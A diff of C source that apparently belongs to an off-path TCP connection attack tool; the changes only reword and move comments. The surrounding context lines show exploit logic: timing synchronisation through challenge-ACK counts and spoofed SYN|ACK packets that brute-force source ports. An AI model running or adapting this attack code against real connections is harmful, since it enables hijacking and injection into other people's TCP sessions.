@@ -165,17 +165,15 @@ int main(int argc, char *argv[])
 	else
 		cliaddr.sin_port = 0;
 
-	/* make sure the target port is valid */
+	/* validate and record the server port */
 	srvport = atoi(argv[2]);
 	if (srvport < 1 || srvport > 65535) {
 		fprintf(stderr, "[!] %s is not a valid port.\n", argv[2]);
 		return 1;
 	}
-
-	/* it's valid, so I plug it in the the remaddr struct */
 	srvaddr.sin_port = htons((u_short)srvport);
 
-	/* lookup ourself */
+	/* look up this machine's address */
 	memset(&myaddr, 0, sizeof(myaddr));
 	if (gethostname(myhost, sizeof(myhost)) == -1) {
 		perror("[!] gethostname");
@@ -462,7 +460,7 @@ int conduct_offpath_attack(void)
 			g_chack_cnt = 0;
 			printf("[*] time-sync: round %d - %d challenge ACKs\n", round + 1, chack_cnt[round]);
 
-			/* did we synch?? */
+			/* did we sync?? */
 			if (chack_cnt[round] == 100) {
 				if (round == 2) {
 					/* verify... */
@@ -561,7 +559,7 @@ int conduct_offpath_attack(void)
 
 				guess_mid = ((uint32_t)guess_start + (uint32_t)guess_end) / 2;
 				for (guess = guess_mid; guess < guess_end; guess++) {
-					/* meh. we have to recalculate the tcp checksum to alter the source port */
+					/* meh. we have to recalculate the TCP checksum to alter the source port */
 					spoof->src->sin_port = htons(guess);
 					if (!tcp_send(g_ctx.pch, spoof, TH_SYN|TH_ACK, NULL, 0))
 						return 0;
@@ -722,13 +720,12 @@ int set_up_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct soc
 						break;
 
 					case CS_CONNECTED:
-						/* see if we got data from remote... */
 						if ((flags & TH_PUSH) && (flags & TH_ACK)
 								&& rack == pconn->seq) {
 							//printf("[*] PSH|ACK received (len %lu)\n", datalen);
 						}
 
-						/* they just ack'd what we sent only... */
+						/* they just ACK'd what we sent only... */
 						else if (flags == TH_ACK && rack == pconn->seq) {
 							//printf("[*] ACK received (len %lu)\n", datalen);
 						}
@@ -755,6 +752,7 @@ int set_up_attack(struct sockaddr_in *ploc, struct sockaddr_in *psrv, struct soc
 						else
 							printf("[*] Packet with unexpected flags (0x%x) received...\n", flags);
 
+						/* see if we got data from remote... */
 						if (datalen > 0) {
 							write(fileno(stdout), data, datalen);
 							pconn->ack += datalen;
